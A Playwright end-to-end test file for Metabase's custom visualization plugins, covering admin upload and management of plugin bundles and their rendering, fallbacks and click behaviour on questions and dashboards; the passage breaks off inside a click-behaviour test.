/**
 * Port of e2e/test/scenarios/visualizations-charts/custom-viz.cy.spec.ts.
 *
 * The custom-visualization (ECharts/plugin) suite: admin CRUD, rendering on
 * questions/dashboards/documents, icon rendering across app surfaces, and the
 * near-membrane-dom sandbox security matrix.
 *
 * Environment / faithfulness notes:
 * - Upstream restores "postgres-writable"; every question in the spec queries
 *   the SAMPLE (H2) database (SAMPLE_DB_TABLES.STATIC_ORDERS_ID), so the
 *   writable-postgres snapshot is never actually queried. Restoring "default"
 *   keeps the spec fully jar-runnable (no external DB) without changing what is
 *   exercised. The plugins themselves are added over the API each test, not from
 *   any snapshot.
 * - Snowplow assertions are no-op stubs (PORTING rule 6); the spike harness has
 *   no snowplow-micro. The UI actions they guard are all preserved.
 * - The "development mode" test is gate-skipped: it drives Cypress node tasks
 *   (SDK build, CLI scaffolding, a spawned Vite dev server on :5174, hot reload)
 *   that have no Playwright equivalent in this harness.
 * - cy.intercept response-body rewrites (sandbox bundle injection) become
 *   page.route + route.fetch + route.fulfill; console spies become a
 *   page.on("console") collector (see support/custom-viz.ts).
 */
import { test, expect } from "../support/fixtures";
import type { MetabaseApi } from "../support/api";
import { isOssBackend } from "../support/admin";
import { openOrdersTable } from "../support/ad-hoc-question";
import { openVizTypeSidebar } from "../support/charts-extras";
import { tooltip } from "../support/charts";
import { getPinnedSection } from "../support/collections";
import {
  commandPalette,
  getProfileLink,
  goToAdmin,
} from "../support/command-palette";
import { commandPaletteSearch } from "../support/filters-repros";
import {
  ALL_USERS_GROUP,
  AGGREGATED_VALUE,
  AGGREGATED_VALUE_FORMATTED,
  CUSTOM_VIZ_DISPLAY,
  CUSTOM_VIZ_FIXTURE_TGZ,
  CUSTOM_VIZ_FIXTURE_TGZ_2,
  CUSTOM_VIZ_FIXTURE_TGZ_3_SECURITY,
  CUSTOM_VIZ_FIXTURE_TGZ_4_SECURITY_COMPONENT,
  CUSTOM_VIZ_IDENTIFIER_3_SECURITY,
  CUSTOM_VIZ_IDENTIFIER_4_SECURITY_COMPONENT,
  STATIC_ORDERS_ID,
  addCustomVizPlugin,
  adminAppLinkText,
  buildDocumentWithCustomVizCard,
  collectConsole,
  countCanaryRequests,
  drillThroughDemoVizClick,
  dropCustomVizBundle,
  expectConsoleCalledWith,
  expectConsoleErrorMatch,
  expectConsoleMatch,
  expectNoBadSnowplowEvents,
  expectUnstructuredSnowplowEvent,
  enableTracking,
  getAddVisualizationLink,
  getCustomVizFixtureHash,
  getCustomVizPluginIcon,
  interceptFailingBundle,
  interceptInjectedBundle,
  mainAppLinkText,
  resetSnowplow,
  updateAdvancedPermissionsGraph,
  visitCustomVizEditForm,
  visitCustomVizNewForm,
  visitCustomVizSettings,
  vizTypeSidebar,
  waitForPluginBundle,
  waitForPluginBundleReplace,
  waitForPluginCreate,
} from "../support/custom-viz";
import {
  addToDocument,
  commandSuggestionDialog,
  commandSuggestionItem,
  createDocument,
  documentContent,
  documentMentionDialog,
  getDocumentCard,
  getDocumentSidebar,
  openDocumentCardMenu,
  visitDocument,
} from "../support/documents-core";
import {
  createDashboard,
  createQuestion,
  createQuestionAndDashboard,
  type DashboardDetails,
  type StructuredQuestionDetails,
} from "../support/factories";
import { entityPickerModal, startNewQuestion } from "../support/notebook";
import { entityPickerModalItem } from "../support/question-new";
import { miniPickerBrowseAll } from "../support/joins";
import { tableInteractive, modal } from "../support/models";
import { queryBuilderFiltersPanel } from "../support/detail-view";
import { addOrUpdateDashboardCard } from "../support/dashboard-management";
import { editDashboard } from "../support/dashboard";
import { getDashboardCard } from "../support/dashboard";
import { openQuestionsSidebar } from "../support/visualizer-basics";
import { createPublicDocumentLink, visitPublicDocument } from "../support/public-documents";
import { queryVisualizationRoot } from "../support/rows";
import { openSharingMenu } from "../support/sharing";
import { visitPublicQuestion } from "../support/sharing";
import { undoToastList } from "../support/organization";
import {
  main,
  navigationSidebar,
  openNavigationSidebar,
  popover,
  queryBuilderHeader,
  visitDashboard,
  visitQuestion,
} from "../support/ui";
import { saveSavedQuestion, vizSettingsSidebar } from "../support/viz-charts-repros";
import { visitEmbeddedPage, visitPublicDashboard } from "../support/question-saved";

const customVizQuestionDetails: StructuredQuestionDetails = {
  name: "Custom Viz Dashboard Question",
  query: {
    "source-table": STATIC_ORDERS_ID,
    aggregation: [["count"]],
  },
  display: CUSTOM_VIZ_DISPLAY,
  visualization_settings: { threshold: 0 },
};

test.describe("admin > custom visualizations", () => {
  test.beforeEach(async ({ mb }) => {
    // Upstream restores "postgres-writable"; the spec never queries the
    // writable postgres (all questions use the sample DB), so "default" keeps
    // it jar-runnable. See file header.
    await mb.restore("default");
    await mb.signInAsAdmin();
  });

  test.describe("feature gating", () => {
    test.describe("EE", () => {
      test("should show upsell when feature is locked", async ({ page }) => {
        // No token activation — feature is locked
        await visitCustomVizSettings(page);

        await expect(
          page.getByRole("heading", { name: /Build your own visualizations/ }),
        ).toBeVisible();
        await expect(getAddVisualizationLink(page)).toHaveCount(0);
      });

      test("should enable and disable custom visualizations", async ({
        page,
        mb,
      }) => {
        await mb.api.activateToken("bleeding-edge");

        await visitCustomVizSettings(page);

        // Enabling custom viz is blocked until the image CSP setting is on
        await expect(
          main(page).getByRole("button", {
            name: /Enable custom visualizations/,
          }),
        ).toBeDisabled();
        await expect(
          main(page).getByText(/Turn on "Restrict image domains"/),
        ).toBeVisible();

        // Turn on the image CSP setting, then custom viz can be enabled
        await mb.api.updateSetting("csp-img-enabled", true);
        await page.reload();

        const enableButton = main(page).getByRole("button", {
          name: /Enable custom visualizations/,
        });
        await expect(enableButton).toBeEnabled();
        await enableButton.click();

        await expect(getAddVisualizationLink(page)).toBeVisible();

        // Deactivate custom visualizations
        await main(page)
          .getByRole("button", { name: /More options/ })
          .click();
        await popover(page).getByText("Deactivate custom visualizations").click();

        await expect(
          main(page).getByRole("heading", { name: "Add a new visualization" }),
        ).toHaveCount(0);
        await expect(
          main(page).getByRole("heading", {
            name: "Enable custom visualizations",
          }),
        ).toBeVisible();
      });

      test('should not show custom visualizations page to non-admins with "Settings access" permission', async ({
        page,
        mb,
      }) => {
        await mb.api.activateToken("bleeding-edge");
        await updateAdvancedPermissionsGraph(mb.api, {
          [ALL_USERS_GROUP]: { setting: "yes" },
        });
        await mb.signInAsNormalUser();

        await page.goto("/admin/settings/custom-visualizations");
        await expect(main(page)).toContainText(
          "Sorry, you don’t have permission to see that.",
        );

        await goToAdmin(page);
        await expect(
          page
            .getByTestId("admin-layout-sidebar")
            .getByText("Custom visualizations"),
        ).toHaveCount(0);
      });

      test("should not show nested sidebar navigation when custom viz plugin dev mode is disabled", async ({
        page,
        mb,
      }) => {
        // Force custom-viz-plugin-dev-mode-enabled off in session properties.
        await page.route("**/api/session/properties", async (route) => {
          const response = await route.fetch();
          const body = await response.json();
          body["custom-viz-plugin-dev-mode-enabled"] = false;
          await route.fulfill({ response, json: body });
        });

        await mb.api.activateToken("bleeding-edge");
        await mb.api.updateSetting("csp-img-enabled", true);
        await mb.api.updateSetting("custom-viz-enabled", true);
        await visitCustomVizSettings(page);
        await getAddVisualizationLink(page).click();

        await expect(
          page
            .getByTestId("admin-layout-sidebar")
            .getByRole("link", { name: /Development/ }),
        ).toHaveCount(0);
        await expect(
          page
            .getByTestId("admin-layout-sidebar")
            .getByRole("link", { name: /Manage visualizations/ }),
        ).toHaveCount(0);
        await expect(
          page
            .getByTestId("admin-layout-sidebar")
            .getByRole("link", { name: /Custom visualizations/ }),
        ).toHaveAttribute("data-active", "true");

        await dropCustomVizBundle(page, CUSTOM_VIZ_FIXTURE_TGZ);
        await page.getByRole("button", { name: "Add visualization" }).click();

        await main(page).getByText("demo-viz").hover();
        await page.getByRole("button", { name: "Plugin actions" }).click();
        await popover(page).getByText("Replace bundle").click();

        await expect(
          page
            .getByTestId("admin-layout-sidebar")
            .getByRole("link", { name: /Custom visualizations/ }),
        ).toHaveAttribute("data-active", "true");
      });
    });

    test.describe("OSS", () => {
      // @OSS-tagged upstream: the "Try for free" CTA is OSS-only — the EE build
      // renders a different upsell — so gate on an OSS backend (the spike
      // backend is EE). Established pattern (embedding-smoketests / admin-authentication).
      test.beforeEach(async ({ mb }) => {
        test.skip(!(await isOssBackend(mb.api)), "OSS-only assertion");
      });

      test("should show upsell when feature is locked", async ({ page }) => {
        await visitCustomVizSettings(page);

        await expect(
          page.getByRole("heading", { name: /Build your own visualizations/ }),
        ).toBeVisible();
        await expect(
          page.getByRole("link", { name: "Try for free" }),
        ).toBeVisible();
        await expect(getAddVisualizationLink(page)).toHaveCount(0);
      });
    });
  });

  test.describe("admin settings page", () => {
    test.beforeEach(async ({ mb }) => {
      await mb.api.activateToken("bleeding-edge");
      await mb.api.updateSetting("csp-img-enabled", true);
      await mb.api.updateSetting("custom-viz-enabled", true);
    });

    test("should add a plugin via the form and show it in the list", async ({
      page,
    }) => {
      await resetSnowplow();
      await enableTracking();
      await visitCustomVizSettings(page);

      await getAddVisualizationLink(page).click();

      // Submit is disabled until a file is selected
      await expect(
        page.getByRole("button", { name: "Add visualization" }),
      ).toBeDisabled();

      await dropCustomVizBundle(page, CUSTOM_VIZ_FIXTURE_TGZ);
      await expect(
        page.getByRole("button", { name: "Add visualization" }),
      ).toBeEnabled();

      const pluginCreate = waitForPluginCreate(page);
      await page.getByRole("button", { name: "Add visualization" }).click();
      await pluginCreate;

      // Should redirect to the list and show the plugin
      await expect(main(page).getByText("demo-viz")).toBeVisible();
      await expectUnstructuredSnowplowEvent({
        event: "custom_viz_plugin_created",
        result: "success",
      });
      await expectNoBadSnowplowEvents();
    });

    test("should display manifest information and bundle hash after upload", async ({
      page,
    }) => {
      await addCustomVizPlugin(page, CUSTOM_VIZ_FIXTURE_TGZ);
      await visitCustomVizSettings(page);
      await expect(getCustomVizPluginIcon(page, "demo-viz")).toBeVisible();
      await expect(main(page).getByText("demo-viz")).toBeVisible();

      // Bundle hash chip is the first 8 chars of the fixture's SHA-256
      const hash = getCustomVizFixtureHash(CUSTOM_VIZ_FIXTURE_TGZ);
      await expect(
        main(page).getByText(`Bundle: ${hash.slice(0, 8)}`),
      ).toBeVisible();

      await expect(main(page).getByText(/^Requires Metabase /)).toBeVisible();
    });

    test("should surface an inline error for an invalid bundle", async ({
      page,
    }) => {
      await visitCustomVizNewForm(page);

      await expect(
        page.getByRole("link", { name: /Manage visualizations/ }),
      ).toHaveAttribute("data-active", "true");

      // Upload a non-tar.gz file so the BE rejects it.
      await dropCustomVizBundle(page, {
        contents: Buffer.from("not a tarball"),
        fileName: "broken.tgz",
        mimeType: "application/gzip",
      });

      const pluginCreateInvalid = waitForPluginCreate(page);
      await page.getByRole("button", { name: "Add visualization" }).click();
      expect((await pluginCreateInvalid).status()).toBe(400);

      // Error is surfaced inline in the form
      await expect(
        page
          .getByTestId("custom-viz-settings-form")
          .getByText(/Bundle is not a valid tar\.gz archive/),
      ).toBeVisible();

      await expect.poll(() => new URL(page.url()).pathname).toBe(
        "/admin/settings/custom-visualizations/new",
      );
    });

    test("should support multiple plugins", async ({ page }) => {
      await addCustomVizPlugin(page, CUSTOM_VIZ_FIXTURE_TGZ);
      await addCustomVizPlugin(page, CUSTOM_VIZ_FIXTURE_TGZ_2);
      await visitCustomVizSettings(page);

      await expect(main(page).getByText("demo-viz", { exact: true })).toBeVisible();
      await expect(main(page).getByText("demo-viz-2")).toBeVisible();

      // Both plugins should be available in chart type selector
      await openOrdersTable(page, { limit: 1 });
      await page.getByTestId("viz-type-button").click();
      const customVizSection = main(page).getByText("Custom visualizations");
      await expect(customVizSection).toBeVisible();
      await customVizSection.click();
      await expect(main(page).getByText("demo-viz", { exact: true })).toBeVisible();
      await expect(main(page).getByText("demo-viz-2")).toBeVisible();
    });

    test.describe("with an installed plugin", () => {
      test.beforeEach(async ({ page }) => {
        await addCustomVizPlugin(page, CUSTOM_VIZ_FIXTURE_TGZ);
        await visitCustomVizSettings(page);
      });

      test("should display plugin details in the list", async ({ page }) => {
        await expect(main(page).getByText("demo-viz")).toBeVisible();
        const hash = getCustomVizFixtureHash(CUSTOM_VIZ_FIXTURE_TGZ);
        await expect(
          main(page).getByText(`Bundle: ${hash.slice(0, 8)}`),
        ).toBeVisible();
      });
    });

    test.describe("updating a plugin", () => {
      test.beforeEach(async ({ mb }) => {
        await mb.api.activateToken("bleeding-edge");
      });

      test("should replace the bundle via the edit form", async ({ page }) => {
        await resetSnowplow();
        await enableTracking();
        const plugin = await addCustomVizPlugin(page, CUSTOM_VIZ_FIXTURE_TGZ);
        await visitCustomVizSettings(page);

        // Replace bundle is reachable only via the row's Plugin actions menu —
        // clicking the row itself does not navigate.
        await main(page).getByText("demo-viz").click();
        await expect(
          page.getByRole("heading", { name: /Replace bundle for/ }),
        ).toHaveCount(0);

        // Actions menu is only visible on row hover
        await main(page).getByText("demo-viz").hover();
        await page.getByRole("button", { name: "Plugin actions" }).click();
        await popover(page).getByText("Replace bundle").click();

        await expect(
          page.getByRole("heading", { name: "Replace bundle for demo-viz" }),
        ).toBeVisible();

        await dropCustomVizBundle(page, CUSTOM_VIZ_FIXTURE_TGZ);

        const bundleReplace = waitForPluginBundleReplace(page, plugin.id);
        await page.getByRole("button", { name: /Replace$/ }).click();
        expect((await bundleReplace).status()).toBe(200);

        // Should redirect back to the list page
        await expect.poll(() => new URL(page.url()).pathname).toBe(
          "/admin/settings/custom-visualizations",
        );
        await expect(main(page).getByText("demo-viz")).toBeVisible();
        await expectUnstructuredSnowplowEvent({
          event: "custom_viz_plugin_updated",
          result: "success",
        });
        await expectNoBadSnowplowEvents();
      });

      test("should surface an inline error when replacing with a non-matching bundle", async ({
        page,
      }) => {
        const plugin = await addCustomVizPlugin(page, CUSTOM_VIZ_FIXTURE_TGZ);
        await visitCustomVizEditForm(page, plugin.id);

        await expect(
          page.getByRole("link", { name: /Manage visualizations/ }),
        ).toHaveAttribute("data-active", "true");

        // The 2nd fixture has manifest.name = "demo-viz-2" — BE rejects because
        // it does not match the existing identifier.
        await dropCustomVizBundle(page, CUSTOM_VIZ_FIXTURE_TGZ_2);

        const bundleReplaceInvalid = waitForPluginBundleReplace(page, plugin.id);
        await page.getByRole("button", { name: /Replace$/ }).click();
        expect((await bundleReplaceInvalid).status()).toBe(400);

        await expect(
          page
            .getByTestId("custom-viz-settings-form")
            .getByText(/does not match the plugin's identifier/),
        ).toBeVisible();

        await expect.poll(() => new URL(page.url()).pathname).toBe(
          `/admin/settings/custom-visualizations/edit/${plugin.id}`,
        );
      });
    });

    test.describe("disabling a plugin", () => {
      test.beforeEach(async ({ mb }) => {
        await mb.api.activateToken("bleeding-edge");
      });

      test("disabled plugin should fall back to default display and hide from chart type selector", async ({
        page,
        mb,
      }) => {
        await resetSnowplow();
        await enableTracking();
        await addCustomVizPlugin(page, CUSTOM_VIZ_FIXTURE_TGZ);
        // Single-value question (Count of Orders) — demo-viz requires exactly
        // one row with one numeric column.
        const card = await createQuestion(mb.api, {
          name: "Custom Viz Disable Test",
          query: {
            "source-table": STATIC_ORDERS_ID,
            aggregation: [["count"]],
          },
          display: CUSTOM_VIZ_DISPLAY,
        });
        await visitQuestion(page, card.id);
        await expect(
          main(page).getByText("Custom viz rendered successfully"),
        ).toBeVisible();

        await getProfileLink(page).click();
        await popover(page).getByText(adminAppLinkText, { exact: true }).click();

        await page
          .getByTestId("admin-layout-sidebar")
          .getByText("Custom visualizations")
          .click();

        await page
          .getByTestId("admin-layout-sidebar")
          .getByText("Manage visualizations")
          .click();

        // Actions menu is only visible on row hover
        await main(page).getByText("demo-viz").hover();
        await page.getByRole("button", { name: "Plugin actions" }).click();
        await popover(page).getByText("Disable").click();
        await expectUnstructuredSnowplowEvent({
          event: "custom_viz_plugin_toggled",
          event_detail: "disabled",
        });

        // Menu should now show "Enable" instead of "Disable"
        await main(page).getByText("demo-viz").hover();
        await page.getByRole("button", { name: "Plugin actions" }).click();
        await expect(popover(page).getByText("Enable")).toBeVisible();

        await getProfileLink(page).click();
        await popover(page).getByText(mainAppLinkText, { exact: true }).click();

        await main(page).getByText("Custom Viz Disable Test").click();

        // make sure viz is table - fallback
        await expect(page.getByTestId("table-root")).toBeVisible();

        // Custom viz section should not appear in chart type selector
        await page.getByTestId("viz-type-button").click();
        await expect(page.getByText("Custom visualizations")).toHaveCount(0);
        await expectNoBadSnowplowEvents();

        // make sure fallback is used after reload
        await page.reload();
        await expect(page.getByText("Custom visualizations")).toHaveCount(0);
      });
    });

    test.describe("deleting a plugin", () => {
      test.beforeEach(async ({ mb }) => {
        await mb.api.activateToken("bleeding-edge");
      });

      test("question should fall back when plugin is deleted", async ({
        page,
        mb,
      }) => {
        await resetSnowplow();
        await enableTracking();
        await addCustomVizPlugin(page, CUSTOM_VIZ_FIXTURE_TGZ);
        const card = await createQuestion(mb.api, {
          name: "Custom Viz Delete Test",
          query: {
            "source-table": STATIC_ORDERS_ID,
            aggregation: [["count"]],
          },
          display: CUSTOM_VIZ_DISPLAY,
        });

        await visitCustomVizSettings(page);

        // Delete the plugin (actions menu is only visible on row hover)
        await main(page).getByText("demo-viz").hover();
        await page.getByRole("button", { name: "Plugin actions" }).click();
        await popover(page).getByText("Remove").click();

        await expect(
          modal(page).getByText("Remove this visualization?"),
        ).toBeVisible();
        await modal(page).getByRole("button", { name: "Remove" }).click();

        await expect(
          main(page).getByText("You don't have any custom visualizations."),
        ).toBeVisible();
        await expectUnstructuredSnowplowEvent({
          event: "custom_viz_plugin_deleted",
        });

        // Visit the question — should fall back to table
        await visitQuestion(page, card.id);
        await expect(page.getByTestId("table-root")).toBeVisible();

        // Custom viz section should not appear in chart type selector
        await page.getByTestId("viz-type-button").click();
        await expect(page.getByText("Custom visualizations")).toHaveCount(0);
        await expectNoBadSnowplowEvents();
      });
    });
  });

  test.describe("using a plugin — question", () => {
    let questionId: number;

    test.beforeEach(async ({ page, mb }) => {
      await mb.api.activateToken("bleeding-edge");
      await mb.api.updateSetting("csp-img-enabled", true);
      await mb.api.updateSetting("custom-viz-enabled", true);
      await addCustomVizPlugin(page, CUSTOM_VIZ_FIXTURE_TGZ);

      // Default-view (table) Count-of-Orders card — demo-viz requires exactly
      // one row with one numeric column.
      const card = await createQuestion(mb.api, {
        name: "Custom Viz Question Test",
        query: {
          "source-table": STATIC_ORDERS_ID,
          aggregation: [["count"]],
        },
        display: "table",
      });
      questionId = card.id;
    });

    async function switchToDemoViz(page: import("@playwright/test").Page) {
      await page.getByTestId("viz-type-button").click();
      await page.getByTestId("custom-viz-plugins-toggle").click();
      await page.getByTestId("demo-viz-button").click();
      // Close the picker so the viz is visible for interaction
      await page.getByTestId("viz-type-button").click();
    }

    test("renders the selected custom viz for the question", async ({ page }) => {
      await resetSnowplow();
      await enableTracking();
      await visitQuestion(page, questionId);
      await switchToDemoViz(page);

      await expect(
        main(page).getByText("Custom viz rendered successfully"),
      ).toBeVisible();
      await expect(main(page).getByText(/Value: \d+/)).toBeVisible();
      // Default threshold from getDefault
      await expect(main(page).getByText("Threshold: 0")).toBeVisible();
      await expectUnstructuredSnowplowEvent({ event: "custom_viz_selected" });
      await expectNoBadSnowplowEvents();
    });

    test("persists the selected custom viz and its settings across reloads", async ({
      page,
    }) => {
      await visitQuestion(page, questionId);
      await switchToDemoViz(page);

      await page.getByTestId("viz-settings-button").click();
      const threshold = page
        .getByTestId("chartsettings-sidebar")
        .getByPlaceholder("Set threshold");
      await threshold.fill("42");
      await threshold.blur();

      await saveSavedQuestion(page);

      const pluginBundle = waitForPluginBundle(page);
      await page.reload();
      await pluginBundle;

      await expect(
        main(page).getByText("Custom viz rendered successfully"),
      ).toBeVisible();
      await expect(main(page).getByText("Threshold: 42")).toBeVisible();
    });

    test.describe("errors", () => {
      test("renders errors thrown by the plugin component", async ({
        page,
        mb,
      }) => {
        // Multi-column question — checkRenderable throws "Query results should
        // only have 1 column".
        const card = await createQuestion(mb.api, {
          name: "Custom Viz Error — Multi Column",
          query: {
            "source-table": STATIC_ORDERS_ID,
            limit: 5,
          },
          display: CUSTOM_VIZ_DISPLAY,
        });
        await visitQuestion(page, card.id);

        await expect(
          main(page).getByText(/Query results should only have 1 column/),
        ).toBeVisible();
      });

      test("shows an error state when the plugin bundle fails to load", async ({
        page,
        mb,
      }) => {
        const failedBundle = interceptFailingBundle(page, {
          status: 500,
          body: "boom",
        });

        const card = await createQuestion(mb.api, {
          name: "Custom Viz — Failing Bundle",
          query: {
            "source-table": STATIC_ORDERS_ID,
            aggregation: [["count"]],
          },
          display: CUSTOM_VIZ_DISPLAY,
        });
        await visitQuestion(page, card.id);
        await failedBundle;

        await expect(
          undoToastList(page).getByText(
            /"demo-viz" visualization is currently unavailable/,
          ),
        ).toBeVisible();
      });

      test("falls back to the default viz when the bundle endpoint fails, then recovers on revisit", async ({
        page,
        mb,
      }) => {
        const bundleUnavailable = interceptFailingBundle(page, {
          status: 503,
          body: JSON.stringify({ error: "Bundle not available" }),
        });

        const card = await createQuestion(mb.api, {
          name: "Custom Viz — Bundle Recovery",
          query: {
            "source-table": STATIC_ORDERS_ID,
            aggregation: [["count"]],
          },
          display: CUSTOM_VIZ_DISPLAY,
        });
        await visitQuestion(page, card.id);
        await bundleUnavailable;

        await expect(
          page.getByTestId("visualization-root").getByTestId("table-root"),
        ).toBeVisible();

        await expect(
          undoToastList(page).getByText(/visualization is currently unavailable/i),
        ).toBeVisible();

        // Restore the real bundle and reload.
        await page.unroute(/\/api\/ee\/custom-viz-plugin\/[^/]+\/bundle/);
        await page.reload();

        await expect(
          main(page).getByText("Custom viz rendered successfully"),
        ).toBeVisible();
      });
    });

    test("falls back to the default viz on a public question (metabase#GDGT-2234)", async ({
      page,
      mb,
    }) => {
      await mb.api.updateSetting("enable-public-sharing", true);

      const card = await createQuestion(mb.api, {
        name: "Public Custom Viz Fallback",
        query: {
          "source-table": STATIC_ORDERS_ID,
          aggregation: [["count"]],
        },
        display: CUSTOM_VIZ_DISPLAY,
      });

      await visitPublicQuestion(page, mb, card.id);

      await expect(page.getByTestId("table-root")).toBeVisible();
    });

    test("falls back to the default viz on an embedded question", async ({
      page,
      mb,
    }) => {
      await mb.api.put(`/api/card/${questionId}`, { enable_embedding: true });

      await visitEmbeddedPage(page, mb, {
        resource: { question: questionId },
        params: {},
      });

      await expect(page.getByTestId("table-root")).toBeVisible();
    });

    test("calls onClick when the viz fires a click", async ({ page }) => {
      await visitQuestion(page, questionId);
      await switchToDemoViz(page);

      await expect(
        main(page).getByText("Custom viz rendered successfully"),
      ).toBeVisible();

      await drillThroughDemoVizClick(page);

      // Drill opens an ad-hoc question showing the underlying Orders rows
      await expect(queryBuilderHeader(page).getByText("Orders")).toBeVisible();
      await expect(tableInteractive(page).getByText("37.65")).toBeVisible();
    });

    test("calls onHover and renders a tooltip", async ({ page }) => {
      await visitQuestion(page, questionId);
      await switchToDemoViz(page);

      await page.getByTestId("demo-viz-hover-target").hover();

      await expect(tooltip(page)).toContainText(AGGREGATED_VALUE_FORMATTED);
    });

    test("renders a pinned custom-viz question in the collection view", async ({
      page,
      mb,
    }) => {
      await visitQuestion(page, questionId);
      await switchToDemoViz(page);
      await saveSavedQuestion(page);

      await mb.api.put(`/api/card/${questionId}`, { collection_position: 1 });

      // Navigate to the collection via the question header's collection badge
      await page.getByRole("link", { name: /Our analytics/ }).click();

      await expect(
        getPinnedSection(page).getByText("Custom Viz Question Test"),
      ).toBeVisible();
      await expect(
        getPinnedSection(page).getByText("Custom viz rendered successfully"),
      ).toBeVisible();
    });

    test("passes the user's locale to the plugin and updates when the user changes it", async ({
      page,
      mb,
    }) => {
      await visitQuestion(page, questionId);
      await switchToDemoViz(page);
      await saveSavedQuestion(page);

      // Default user locale is "en"
      await expect(page.getByTestId("demo-viz-locale")).toHaveText("Locale: en");

      // Change the current user's locale to German. The plugin factory runs
      // again on the next full page load with the new locale value.
      const user = await (await mb.api.get("/api/user/current")).json();
      await mb.api.put(`/api/user/${user.id}`, { locale: "de" });

      const pluginBundle = waitForPluginBundle(page);
      await page.reload();
      await pluginBundle;

      await expect(page.getByTestId("demo-viz-locale")).toHaveText("Locale: de");
    });
  });

  test.describe("using a plugin — dashboard", () => {
    test.beforeEach(async ({ page, mb }) => {
      await mb.api.activateToken("bleeding-edge");
      await mb.api.updateSetting("csp-img-enabled", true);
      await mb.api.updateSetting("custom-viz-enabled", true);
      await addCustomVizPlugin(page, CUSTOM_VIZ_FIXTURE_TGZ);
    });

    function createCustomVizDashboard(
      api: MetabaseApi,
      dashboardDetails: DashboardDetails = {},
    ) {
      return createQuestionAndDashboard(api, {
        questionDetails: customVizQuestionDetails,
        dashboardDetails: { name: "Custom Viz Dashboard", ...dashboardDetails },
      });
    }

    test("renders a custom viz question on a dashboard", async ({ page, mb }) => {
      const { dashboardId } = await createCustomVizDashboard(mb.api);
      await visitDashboard(page, mb.api, dashboardId);

      await expect(
        getDashboardCard(page).getByText("Custom viz rendered successfully"),
      ).toBeVisible();
      await expect(
        getDashboardCard(page).getByText(`Value: ${AGGREGATED_VALUE}`),
      ).toBeVisible();
    });

    test("falls back to the default viz on a public dashboard (metabase#GDGT-2234)", async ({
      page,
      mb,
    }) => {
      await mb.api.updateSetting("enable-public-sharing", true);

      const { dashboardId } = await createCustomVizDashboard(mb.api);
      await visitPublicDashboard(page, mb, Number(dashboardId));

      await expect(
        getDashboardCard(page).getByTestId("table-root"),
      ).toBeVisible();
    });

    test("falls back to the default viz on an embedded dashboard", async ({
      page,
      mb,
    }) => {
      const { dashboardId } = await createCustomVizDashboard(mb.api);
      await mb.api.put(`/api/dashboard/${dashboardId}`, {
        enable_embedding: true,
      });

      await visitEmbeddedPage(page, mb, {
        resource: { dashboard: Number(dashboardId) },
        params: {},
      });

      await expect(
        getDashboardCard(page).getByTestId("table-root"),
      ).toBeVisible();
    });

    test("exports the dashboard as a PDF", async ({ page, mb }) => {
      const { dashboardId } = await createCustomVizDashboard(mb.api, {
        name: "custom viz pdf dash",
      });
      await visitDashboard(page, mb.api, dashboardId);
      await expect(
        getDashboardCard(page).getByText("Custom viz rendered successfully"),
      ).toBeVisible();

      const download = page.waitForEvent("download");
      await openSharingMenu(page, "Export as PDF");
      await expect(page.getByTestId("status-root-container")).toContainText(
        "Downloading",
      );
      await expect(page.getByTestId("status-root-container")).toContainText(
        "Dashboard for custom viz pdf dash",
      );
      expect((await download).suggestedFilename()).toContain(
        "custom viz pdf dash.pdf",
      );
    });

    test("shows a tooltip on hover over the custom viz in a dashcard", async ({
      page,
      mb,
    }) => {
      const { dashboardId } = await createCustomVizDashboard(mb.api);
      await visitDashboard(page, mb.api, dashboardId);

      await getDashboardCard(page).getByTestId("demo-viz-hover-target").hover();

      await expect(tooltip(page)).toContainText(AGGREGATED_VALUE_FORMATTED);
    });

    test("drills through on click from a dashcard", async ({ page, mb }) => {
      const { dashboardId } = await createCustomVizDashboard(mb.api);
      await visitDashboard(page, mb.api, dashboardId);
      await expect(
        getDashboardCard(page).getByText("Custom viz rendered successfully"),
      ).toBeVisible();

      await drillThroughDemoVizClick(page);

      await expect(queryBuilderHeader(page).getByText("Orders")).toBeVisible();
      // The demo plugin's query is `count(Orders)` with no breakout, so the
      // underlying-records drill produces an unfiltered Orders query.
      await expect(queryBuilderFiltersPanel(page)).toHaveCount(0);
      await expect(tableInteractive(page).getByText("37.65")).toBeVisible();
    });

    test.describe("click behavior: custom destinations", () => {
      test("navigates to another dashboard", async ({ page, mb }) => {
        const targetDashboard = await createDashboard(mb.api, {
          name: "Custom Viz Target Dashboard",
        });
        const dashcard = await createCustomVizDashboard(mb.api);
        await addOrUpdateDashboardCard(mb.api, {
          dashboard_id: dashcard.dashboard_id,
          card_id: dashcard.card_id,
          card: {
            id: dashcard.id,
            visualization_settings: {
              click_behavior: {
                parameterMapping: {},
                targetId: targetDashboard.id,
                linkType: "dashboard",
                type: "link",
              },
            },
          },
        });
        await visitDashboard(page, mb.api, dashcard.dashboard_id);

        await getDashboardCard(page)
          .getByTestId("demo-viz-click-target")
          .click();

        await expect
          .poll(() => new URL(page.url()).pathname)
          .toMatch(new RegExp(`^/dashboard/${targetDashboard.id}(?:-|$)`));
      });

      test("navigates to a saved question", async ({ page, mb }) => {
        const targetQuestion = await createQuestion(mb.api, {
          name: "Custom Viz Target Question",
          query: {
            "source-table": STATIC_ORDERS_ID,
            limit: 5,
          },
        });
        const dashcard = await createCustomVizDashboard(mb.api);
        await addOrUpdateDashboardCard(mb.api, {
          dashboard_id: dashcard.dashboard_id,
          card_id: dashcard.card_id,
          card: {
            id: dashcard.id,
            visualization_settings: {
              click_behavior: {
                parameterMapping: {},
                targetId: targetQuestion.id,
                linkType: "question",
                type: "link",
              },
            },
          },
        });
        await visitDashboard(page, mb.api, dashcard.dashboard_id);

        await getDashboardCard(page)
          .getByTestId("demo-viz-click-target")
          .click();

        await expect
          .poll(() => new URL(page.url()).pathname)
          .toMatch(new RegExp(`^/question/${targetQuestion.id}(?:-|$)`));
      });

      test("opens a URL", async ({ page, mb }) => {
        const dashcard = await createCustomVizDashboard(mb.api);
        await addOrUpdateDashboardCard(mb.api, {
          dashboard_id: dashcard.dashboard_id,
          card_id: dashcard.card_id,
          card: {
            id: dashcard.id,
            visualization_settings: {
              click_behavior: {
                linkType: "url",
                linkTemplate: "https://metabase.test/custom-viz",
                type: "link",
              },
            },
          },
        });
        await visitDashboard(page, mb.api, dashcard.dashboard_id);

        // Port of H.onNextAnchorClick: capture the dynamically-created anchor's
        // href and prevent the navigation. Assert OUTSIDE the hook so a
        // never-fired click fails loudly (PORTING wave-9 slot-1 note).
        await page.evaluate(() => {
          const win = window as unknown as {
            __capturedHref?: string | null;
          };
          win.__capturedHref = null;
          const original = window.HTMLAnchorElement.prototype.click;
